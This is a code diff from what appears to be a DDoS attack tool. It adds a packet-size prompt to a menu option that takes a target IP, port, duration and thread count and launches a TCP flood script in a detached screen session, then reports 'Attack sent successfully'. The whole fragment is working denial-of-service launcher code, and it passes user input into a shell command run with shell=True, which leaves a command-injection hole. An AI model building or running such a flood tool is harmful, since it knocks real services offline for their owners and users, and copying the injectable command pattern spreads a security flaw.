@@ -514,8 +514,9 @@ class Tool:
 					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
 					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
+					size = int(input(f"{Color.LG} [>] Size: "+Color.RESET))
 					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
-					subprocess.run([f'screen -dm python3 utils/L4/tcp {ip} {port} {floodtime} {thread}'], shell=True)
+					subprocess.run([f'screen -dm python3 utils/L4/tcp {ip} {port} {floodtime} {size} {thread}'], shell=True)
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
